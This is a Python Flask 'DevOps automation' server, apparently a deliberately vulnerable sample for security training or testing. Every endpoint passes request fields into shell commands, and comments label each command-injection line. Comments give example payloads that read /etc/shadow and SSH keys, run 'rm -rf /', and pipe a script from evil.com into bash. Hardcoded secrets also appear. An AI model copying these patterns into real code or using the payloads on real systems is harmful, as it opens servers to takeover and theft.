#!/usr/bin/env python3
"""
DevOps Automation Platform
Infrastructure management and deployment system
Version 6.2.0
"""

import os
import subprocess
import shlex
import json
import yaml
import tempfile
import shutil
import tarfile
import zipfile
from flask import Flask, request, jsonify, send_file
from datetime import datetime
import logging
import sqlite3
import re
import socket
import paramiko
import docker
import requests

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'devops-platform-2024')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

DATABASE = 'automation.db'
WORKSPACE = '/opt/devops/workspace'
SCRIPTS_DIR = '/opt/devops/scripts'
LOGS_DIR = '/var/log/devops'
DOCKER_REGISTRY = 'registry.company.com'

# Create directories
for directory in [WORKSPACE, SCRIPTS_DIR, LOGS_DIR]:
    os.makedirs(directory, exist_ok=True)

def init_db():
    """Initialize automation database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deployments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project_name TEXT NOT NULL,
            environment TEXT NOT NULL,
            version TEXT NOT NULL,
            command TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            output TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS server_health (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT NOT NULL,
            check_type TEXT NOT NULL,
            result TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

@app.route('/api/ping', methods=['POST'])
def ping_server():
    """Ping a server to check connectivity"""
    data = request.get_json()
    hostname = data.get('hostname', 'localhost')
    count = data.get('count', '4')
    
    # VULNERABILITY: hostname and count directly inserted into command
    # Attacker can inject: hostname = "google.com; cat /etc/passwd"
    # This executes: ping -c 4 google.com; cat /etc/passwd
    command = f"ping -c {count} {hostname}"  # LINE 82: COMMAND INJECTION - User input in command
    
    try:
        # VULNERABILITY: Using shell=True with user input
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)  # LINE 86: SHELL INJECTION
        
        return jsonify({
            'success': True,
            'command': command,  # VULNERABILITY: Exposing executed command
            'output': result.stdout,
            'error': result.stderr,
            'return_code': result.returncode
        }), 200
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timed out'}), 408
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/dns_lookup', methods=['POST'])
def dns_lookup():
    """Perform DNS lookup for a domain"""
    data = request.get_json()
    domain = data.get('domain')
    record_type = data.get('type', 'A')
    
    if not domain:
        return jsonify({'error': 'Domain required'}), 400
    
    # VULNERABILITY: Domain name injected into nslookup command
    # Attacker can input: "google.com && cat /etc/shadow"
    cmd = f"nslookup -type={record_type} {domain}"  # LINE 111: COMMAND INJECTION - Domain in command
    
    try:
        # VULNERABILITY: os.system() is even more dangerous than subprocess
        output = os.popen(cmd).read()  # LINE 115: OS COMMAND EXECUTION
        
        return jsonify({
            'success': True,
            'domain': domain,
            'output': output
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/deploy', methods=['POST'])
def deploy_application():
    """Deploy application to server"""
    data = request.get_json()
    project = data.get('project')
    version = data.get('version')
    environment = data.get('environment', 'staging')
    custom_args = data.get('args', '')
    
    if not project or not version:
        return jsonify({'error': 'Project and version required'}), 400
    
    # VULNERABILITY: Multiple injection points in deployment command
    # User controls project, version, and custom_args
    # Can inject: project = "app; rm -rf /"
    deploy_script = f"/opt/deploy.sh {project} {version} --env {environment} {custom_args}"  # LINE 139: MULTIPLE INJECTION POINTS
    
    # Log deployment
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO deployments (project_name, environment, version, command) VALUES (?, ?, ?, ?)",
        (project, environment, version, deploy_script)
    )
    deployment_id = cursor.lastrowid
    conn.commit()
    
    try:
        # VULNERABILITY: Executing deployment with shell=True
        result = subprocess.run(deploy_script, shell=True, capture_output=True, text=True)  # LINE 152: SHELL EXECUTION
        
        # Update deployment status
        cursor.execute(
            "UPDATE deployments SET status = ?, output = ? WHERE id = ?",
            ('completed' if result.returncode == 0 else 'failed', result.stdout + result.stderr, deployment_id)
        )
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': result.returncode == 0,
            'deployment_id': deployment_id,
            'output': result.stdout,
            'error': result.stderr
        }), 200
    except Exception as e:
        conn.close()
        return jsonify({'error': str(e)}), 500

@app.route('/api/backup', methods=['POST'])
def create_backup():
    """Create backup of specified directory"""
    data = request.get_json()
    source_dir = data.get('source', '/var/www')
    backup_name = data.get('name', f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
    compression = data.get('compression', 'gzip')
    
    # VULNERABILITY: User controls source directory and backup name
    # Can inject: source_dir = "/etc && cat /etc/passwd > /tmp/leaked.txt && echo /var/www"
    backup_path = f"/backups/{backup_name}.tar.{compression[0]}"
    
    # VULNERABILITY: tar command with user input
    if compression == 'gzip':
        cmd = f"tar -czf {backup_path} {source_dir}"  # LINE 184: COMMAND INJECTION - Source dir in tar command
    elif compression == 'bzip2':
        cmd = f"tar -cjf {backup_path} {source_dir}"  # LINE 186: COMMAND INJECTION
    else:
        cmd = f"tar -cf {backup_path} {source_dir}"  # LINE 188: COMMAND INJECTION
    
    try:
        # VULNERABILITY: Executing tar with user input
        subprocess.run(cmd, shell=True, check=True)  # LINE 192: SHELL EXECUTION
        
        return jsonify({
            'success': True,
            'backup_file': backup_path,
            'size': os.path.getsize(backup_path) if os.path.exists(backup_path) else 0
        }), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'error': f'Backup failed: {str(e)}'}), 500

@app.route('/api/git_clone', methods=['POST'])
def git_clone():
    """Clone a git repository"""
    data = request.get_json()
    repo_url = data.get('repo_url')
    branch = data.get('branch', 'main')
    destination = data.get('destination', WORKSPACE)
    
    if not repo_url:
        return jsonify({'error': 'Repository URL required'}), 400
    
    # VULNERABILITY: Git URL and branch can contain shell commands
    # Attacker can inject: repo_url = "https://github.com/user/repo || curl evil.com/shell.sh | bash"
    clone_cmd = f"git clone -b {branch} {repo_url} {destination}"  # LINE 214: COMMAND INJECTION - Multiple parameters
    
    try:
        # VULNERABILITY: Executing git command with user input
        result = subprocess.run(clone_cmd, shell=True, capture_output=True, text=True, cwd=WORKSPACE)  # LINE 218: SHELL EXECUTION
        
        if result.returncode == 0:
            return jsonify({
                'success': True,
                'message': 'Repository cloned successfully',
                'output': result.stdout
            }), 200
        else:
            return jsonify({
                'error': 'Clone failed',
                'details': result.stderr
            }), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/docker_build', methods=['POST'])
def docker_build():
    """Build Docker image"""
    data = request.get_json()
    dockerfile_path = data.get('dockerfile', 'Dockerfile')
    image_name = data.get('image_name')
    tag = data.get('tag', 'latest')
    build_args = data.get('build_args', '')
    
    if not image_name:
        return jsonify({'error': 'Image name required'}), 400
    
    # VULNERABILITY: Docker build command with user input
    # Can inject through image_name, tag, or build_args
    # Example: image_name = "myapp; docker run -v /:/host alpine cat /host/etc/shadow"
    build_cmd = f"docker build -f {dockerfile_path} -t {image_name}:{tag} {build_args} ."  # LINE 249: COMMAND INJECTION
    
    try:
        # VULNERABILITY: Running docker command with shell=True
        result = subprocess.run(build_cmd, shell=True, capture_output=True, text=True, cwd=WORKSPACE)  # LINE 253: SHELL EXECUTION
        
        if result.returncode == 0:
            # Push to registry
            push_cmd = f"docker push {DOCKER_REGISTRY}/{image_name}:{tag}"  # LINE 257: COMMAND INJECTION
            subprocess.run(push_cmd, shell=True)  # LINE 258: SHELL EXECUTION
            
            return jsonify({
                'success': True,
                'image': f"{DOCKER_REGISTRY}/{image_name}:{tag}",
                'build_output': result.stdout
            }), 200
        else:
            return jsonify({'error': 'Build failed', 'details': result.stderr}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/run_script', methods=['POST'])
def run_script():
    """Execute a script from the scripts directory"""
    data = request.get_json()
    script_name = data.get('script')
    parameters = data.get('parameters', '')
    interpreter = data.get('interpreter', 'bash')
    
    if not script_name:
        return jsonify({'error': 'Script name required'}), 400
    
    # VULNERABILITY: Script name and parameters injectable
    # Attacker can use: script_name = "../../../bin/sh -c 'malicious command'"
    script_path = os.path.join(SCRIPTS_DIR, script_name)  # LINE 283: PATH TRAVERSAL
    
    # VULNERABILITY: Interpreter and parameters are user-controlled
    # Can inject: interpreter = "bash -c 'evil command' #"
    cmd = f"{interpreter} {script_path} {parameters}"  # LINE 287: COMMAND INJECTION - All parameters controllable
    
    try:
        # VULNERABILITY: Direct execution with shell=True
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)  # LINE 291: SHELL EXECUTION
        
        return jsonify({
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'return_code': result.returncode
        }), 200
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Script execution timed out'}), 408
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/system_info', methods=['POST'])
def system_info():
    """Get system information"""
    data = request.get_json()
    info_type = data.get('type', 'basic')
    custom_command = data.get('command', '')
    
    commands = {
        'basic': 'uname -a',
        'memory': 'free -h',
        'disk': 'df -h',
        'processes': 'ps aux',
        'network': 'netstat -tuln',
        'custom': custom_command  # VULNERABILITY: User-provided command
    }
    
    # VULNERABILITY: User can specify 'custom' type with any command
    cmd = commands.get(info_type, 'uname -a')  # LINE 320: COMMAND INJECTION via custom command
    
    try:
        # VULNERABILITY: Executing system command
        output = subprocess.check_output(cmd, shell=True, text=True)  # LINE 324: SHELL EXECUTION
        
        return jsonify({
            'success': True,
            'type': info_type,
            'output': output
        }), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'error': f'Command failed: {str(e)}'}), 500

@app.route('/api/log_search', methods=['POST'])
def search_logs():
    """Search in log files"""
    data = request.get_json()
    log_file = data.get('file', 'application.log')
    search_term = data.get('search')
    lines = data.get('lines', '50')
    
    if not search_term:
        return jsonify({'error': 'Search term required'}), 400
    
    # VULNERABILITY: grep command with user input
    # Can inject: search_term = "'; cat /etc/passwd #"
    log_path = os.path.join(LOGS_DIR, log_file)
    grep_cmd = f"grep '{search_term}' {log_path} | tail -n {lines}"  # LINE 347: COMMAND INJECTION - Search term in grep
    
    try:
        # VULNERABILITY: Executing grep with user input
        result = subprocess.run(grep_cmd, shell=True, capture_output=True, text=True)  # LINE 351: SHELL EXECUTION
        
        return jsonify({
            'success': True,
            'matches': result.stdout.split('\n') if result.stdout else [],
            'count': len(result.stdout.split('\n')) if result.stdout else 0
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/database_export', methods=['POST'])
def export_database():
    """Export database with user-specified options"""
    data = request.get_json()
    db_name = data.get('database')
    output_format = data.get('format', 'sql')
    tables = data.get('tables', '*')
    
    if not db_name:
        return jsonify({'error': 'Database name required'}), 400
    
    output_file = f"/tmp/{db_name}_export.{output_format}"
    
    # VULNERABILITY: Database name and tables injectable
    # Can inject: db_name = "mydb; cat /root/.ssh/id_rsa > /tmp/key.txt; echo test"
    if output_format == 'sql':
        cmd = f"mysqldump -u root -p'password' {db_name} {tables} > {output_file}"  # LINE 376: COMMAND INJECTION
    elif output_format == 'csv':
        cmd = f"mysql -u root -p'password' {db_name} -e 'SELECT * FROM {tables}' | sed 's/\t/,/g' > {output_file}"  # LINE 378: COMMAND INJECTION
    else:
        return jsonify({'error': 'Invalid format'}), 400
    
    try:
        # VULNERABILITY: Executing database command
        subprocess.run(cmd, shell=True, check=True)  # LINE 384: SHELL EXECUTION
        
        return send_file(output_file, as_attachment=True)
    except subprocess.CalledProcessError as e:
        return jsonify({'error': f'Export failed: {str(e)}'}), 500

@app.route('/api/ssh_command', methods=['POST'])
def ssh_remote_command():
    """Execute command on remote server via SSH"""
    data = request.get_json()
    hostname = data.get('hostname')
    username = data.get('username', 'root')
    command = data.get('command')
    port = data.get('port', '22')
    
    if not hostname or not command:
        return jsonify({'error': 'Hostname and command required'}), 400
    
    # VULNERABILITY: SSH command with user input
    # Multiple injection points: username, hostname, port, command
    # Can inject: command = "ls; cat /etc/shadow"
    ssh_cmd = f"ssh -p {port} {username}@{hostname} '{command}'"  # LINE 405: COMMAND INJECTION - Multiple parameters
    
    try:
        # VULNERABILITY: Executing SSH with user input
        result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)  # LINE 409: SHELL EXECUTION
        
        return jsonify({
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr
        }), 200
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'SSH command timed out'}), 408
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/file_operation', methods=['POST'])
def file_operation():
    """Perform file operations"""
    data = request.get_json()
    operation = data.get('operation')
    file_path = data.get('path')
    destination = data.get('destination', '')
    
    if not operation or not file_path:
        return jsonify({'error': 'Operation and path required'}), 400
    
    # VULNERABILITY: File operations with user-controlled paths
    operations = {
        'copy': f"cp {file_path} {destination}",  # LINE 434: COMMAND INJECTION
        'move': f"mv {file_path} {destination}",  # LINE 435: COMMAND INJECTION
        'delete': f"rm -f {file_path}",  # LINE 436: COMMAND INJECTION
        'compress': f"zip -r {destination} {file_path}",  # LINE 437: COMMAND INJECTION
        'permissions': f"chmod 755 {file_path}"  # LINE 438: COMMAND INJECTION
    }
    
    cmd = operations.get(operation)
    if not cmd:
        return jsonify({'error': 'Invalid operation'}), 400
    
    try:
        # VULNERABILITY: Executing file operation
        subprocess.run(cmd, shell=True, check=True)  # LINE 447: SHELL EXECUTION
        
        return jsonify({'success': True, 'message': f'{operation} completed'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'error': f'Operation failed: {str(e)}'}), 500

@app.route('/api/url_fetch', methods=['POST'])
def fetch_url():
    """Fetch content from URL using curl"""
    data = request.get_json()
    url = data.get('url')
    output_file = data.get('output', '/tmp/download')
    options = data.get('options', '')
    
    if not url:
        return jsonify({'error': 'URL required'}), 400
    
    # VULNERABILITY: curl command with user input
    # Can inject: url = "http://example.com; cat /etc/passwd"
    # Or: options = "-o /etc/cron.d/malicious"
    curl_cmd = f"curl {options} -o {output_file} {url}"  # LINE 467: COMMAND INJECTION - URL and options
    
    try:
        # VULNERABILITY: Executing curl command
        subprocess.run(curl_cmd, shell=True, check=True, timeout=30)  # LINE 471: SHELL EXECUTION
        
        with open(output_file, 'r') as f:
            content = f.read()
        
        return jsonify({
            'success': True,
            'content': content[:1000],  # First 1000 chars
            'size': os.path.getsize(output_file)
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.errorhandler(500)
def internal_error(error):
    """500 error handler"""
    # VULNERABILITY: Command errors might reveal sensitive information
    return jsonify({
        'error': 'Internal server error',
        'details': str(error)  # LINE 490: INFORMATION DISCLOSURE
    }), 500

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5004, debug=False)